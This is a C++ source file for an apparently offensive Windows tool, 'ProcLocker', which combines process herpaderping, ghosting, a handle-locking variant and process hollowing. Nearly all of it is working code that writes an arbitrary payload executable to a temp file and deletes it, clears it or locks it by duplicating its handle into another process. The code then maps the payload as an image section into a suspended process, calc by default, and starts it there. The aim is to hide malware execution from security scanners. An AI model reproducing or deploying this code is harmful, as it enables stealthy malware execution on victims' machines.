#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "kernel32_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "hollowing_parts.h"
#include "process_env.h"
#include "lockFileUtil.h"

#include <comdef.h>
#pragma comment(lib, "Ntdll.lib")


bool create_new_process_internal(PROCESS_INFORMATION& pi, LPWSTR cmdLine, LPWSTR startDir = NULL)
{
    if (!load_kernel32_functions()) return false;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
        NULL, //lpApplicationName
        (LPWSTR)cmdLine, //lpCommandLine
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, //dwCreationFlags
        NULL, //lpEnvironment 
        startDir, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi, //lpProcessInformation
        &hNewToken
    ))
    {
        printf("[ERROR] CreateProcessInternalW failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
            return NULL;
        }
    }
    return sectionBaseAddress;
}

HANDLE open_file(wchar_t* filePath)
{
    // convert to NT path
    std::wstring nt_path = L"\\??\\" + std::wstring(filePath);

    UNICODE_STRING file_name = { 0 };
    RtlInitUnicodeString(&file_name, nt_path.c_str());

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK status_block = { 0 };
    HANDLE file = INVALID_HANDLE_VALUE;
    NTSTATUS stat = NtOpenFile(&file,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr,
        &status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(stat)) {
        std::cout << "[X} Failed to open, status: " << std::hex << stat << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    std::wcout << "[+] Created temp file: " << filePath << "\n";
    return file;
}



HANDLE prep_payload_file(BYTE* payladBuf, DWORD payloadSize, const char* method, DWORD lock_pid = 0) {

    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

    wchar_t* filePath = dummy_name;

    HANDLE hFile = open_file(filePath);
    if (!hFile || hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[X] Failed to create file" << std::dec << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }


    IO_STATUS_BLOCK status_block = { 0 };

    NTSTATUS status = 0;

    if (strcmp(method, "ghosting") == 0) {
        // Set disposition flag
        FILE_DISPOSITION_INFORMATION info = { 0 };
        info.DeleteFile = TRUE;

        status = NtSetInformationFile(hFile, &status_block, &info, sizeof(info), FileDispositionInformation);
        if (!NT_SUCCESS(status)) {
            std::cout << "Setting information failed: " << std::hex << status << "\n";
            return INVALID_HANDLE_VALUE;
        }
        std::cout << "[*] File disposition information set\n";
    }
    
    LARGE_INTEGER ByteOffset = { 0 };

    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        payladBuf,
        payloadSize,
        &ByteOffset,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        DWORD err = GetLastError();
        std::cerr << "[X] Failed writing payload! Error: " << std::hex << err << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    std::cout << "[+] Written!\n";

    if (strcmp(method, "lockering") == 0) {
        //duplicate file hanlde
        printf("[+] Duplicating file handle to %d\n", DWORD(lock_pid));
        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, DWORD(lock_pid));

        HANDLE hLockFile;
        if (!DuplicateHandle(GetCurrentProcess(), hFile, hProcess, &hLockFile, 0, 0, DUPLICATE_SAME_ACCESS)) {
            printf("[X] Failed locking file (%d)\n", GetLastError());
            return INVALID_HANDLE_VALUE;
        }
        printf("[+] File locked\n");
    }

    return hFile;
}


HANDLE make_section_from_file(HANDLE hFile, const char* method)
{
   
    NTSTATUS status = 0;

    HANDLE hSection = nullptr;
    status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    if (strcmp(method, "herpaderping") == 0) {
        ClearContent(hFile);
    }
    NtClose(hFile);

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        std::cout << "[X] Creating section has failed!\n";
        return INVALID_HANDLE_VALUE;
    }

    return hSection;
}

bool hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, HANDLE hSection) {
       
    wchar_t* start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, NULL);
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };
    if (!create_new_process_internal(pi, targetPath, start_dir)) {
        std::cerr << "[X] Creating process failed!\n";
        return false;
    }
    std::cout << "[+] Created Process PID: " << std::dec << pi.dwProcessId << "\n";
    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = map_buffer_into_process(hProcess, hSection);
    if (!remote_base) {
        std::cerr << "[X] Failed mapping the buffer!\n";
        return false;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        std::cerr << "[X] Failed to redirect!\n";
        return false;
    }
    std::cout << "[+] Resuming PID " << std::dec << pi.dwProcessId << std::endl;
    //Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return true;
    

}

bool create_process_from_section(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, HANDLE hSection)
{
    
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        PS_INHERIT_HANDLES, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed" << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;

    DWORD payload_ep = get_entry_point_rva(payladBuf);
    ULONGLONG procEntry = payload_ep + imageBase;
    
    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    
    std::cout << "[+] Process created! Pid = " << GetProcessId(hProcess) << "\n";
    HANDLE hThread = NULL;

    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }

    return true;
}


void printHelp() {
    std::cout <<
        "Herpaderply Hollowing | Ghostly Hollowing | Locker Hollowing\n"
        "More info: https://github.com/Hagrid29/herpaderply_hollowing/\n";
    std::cout <<
        "\nHerpaderping\n"
        "\t.\\ProcLocker.exe herpaderp <process | hollow> <PAYLOAD>\n"
        "Ghosting\n"
        "\t.\\ProcLocker.exe ghost <process | hollow> <PAYLOAD>\n"
        "Lockering\n"
        "\t.\\ProcLocker.exe locker <process | hollow> <PAYLOAD | LOCKED FILE> <PID> <auto | exec>\n"
        "\t.\\ProcLocker.exe <lock | clear> <PAYLOAD | LOCKED FILE> <PID>\n"
         << std::endl;
    return;
}

int wmain(int argc, wchar_t* argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
   
    if (argc < 4) {
        printHelp();
        return 0;
    }
    const char* method = NULL;
    bool isHollow = FALSE;
    bool autoexec = TRUE;
    DWORD lock_pid = 0;
    if (init_ntdll_func() == false) {
        return -1;
    }

    if (wcscmp(argv[1], L"lock")==0) {

        wchar_t* payloadPath = argv[2];
        DWORD lock_pid = _wtoi(argv[3]);
        size_t payloadSize = 0;

        HANDLE hFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[X] Could not open file!" << std::endl;
        }
        BYTE* payladBuf = buffer_payload(hFile, payloadSize);
        CloseHandle(hFile);
        if (payladBuf == NULL) {
            std::cerr << "[X] Cannot read payload!" << std::endl;
            return -1;
        }

        prep_payload_file(payladBuf, payloadSize, "lockering", lock_pid);
        return 0;

    }
    else if (wcscmp(argv[1], L"clear") == 0) {

        wchar_t* lockedFile = argv[2];
        DWORD lock_pid = _wtoi(argv[3]);

        bool releaseFile = TRUE;

        _bstr_t b(lockedFile);
        const char* c = b;
        //suspend process
        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, 0, lock_pid);
        HANDLE hTargetFile = CopyFileHandle(hProcess, c, releaseFile);
        if (hTargetFile != NULL)
            ClearContent(hTargetFile);
        NtResumeProcess(hProcess);
        CloseHandle(hTargetFile);

        return 0;
    }
    else if (wcscmp(argv[1], L"locker") == 0) {
        method = "lockering";
        lock_pid = _wtoi(argv[4]);
        if (wcscmp(argv[5], L"auto") == 0) {
            autoexec = TRUE;
        }
        else if (wcscmp(argv[5], L"exec") == 0) {
            autoexec = FALSE;
        }
    }
    else if (wcscmp(argv[1], L"ghost") == 0) {
        method = "ghosting";
    }
    else if (wcscmp(argv[1], L"herpaderp") == 0) {
        method = "herpaderping";
    }
    else {
        printHelp();
        return 0;
    }

    if (wcscmp(argv[2], L"hollow") == 0) {
        isHollow = TRUE;
    }
    else if (wcscmp(argv[2], L"process") == 0) {
        isHollow = FALSE;
    }


    wchar_t defaultTarget[MAX_PATH] = { 0 };
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t* targetPath = defaultTarget;
    wchar_t* payloadPath = argv[3];
    HANDLE hFile = NULL;
    HANDLE hLockFile = NULL;
    if (autoexec) {
        hFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[X] Could not open file!" << std::endl;
        }
    }
    else{
        bool releaseFile = FALSE;

        _bstr_t b(payloadPath);
        const char* lockedFile = b;
        //suspend process
        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, 0, lock_pid);
        hFile = CopyFileHandle(hProcess, lockedFile, releaseFile);
    }
    

    size_t payloadSize = 0;
    BYTE* payladBuf = buffer_payload(hFile, payloadSize);

    if (payladBuf == NULL) {
        std::cerr << "[X] Cannot read payload!" << std::endl;
        return -1;
    }
    HANDLE hSection = NULL;
    if (autoexec) {
        CloseHandle(hFile);
        hLockFile = prep_payload_file(payladBuf, payloadSize, method, lock_pid);
        hSection = make_section_from_file(hLockFile, method);

    }
    else {
        hSection = make_section_from_file(hFile, method);
        CloseHandle(hFile);
    }

    bool is_ok = false;
    if (isHollow) {
        is_ok = hollowing(targetPath, payladBuf, (DWORD)payloadSize, hSection);
    }
    else {
        is_ok = create_process_from_section(targetPath, payladBuf, (DWORD)payloadSize, hSection);
    }

    free_buffer(payladBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    }
    else {
        std::cerr << "[-] Failed!" << std::endl;
        return -1;
    }

    return 0;
}
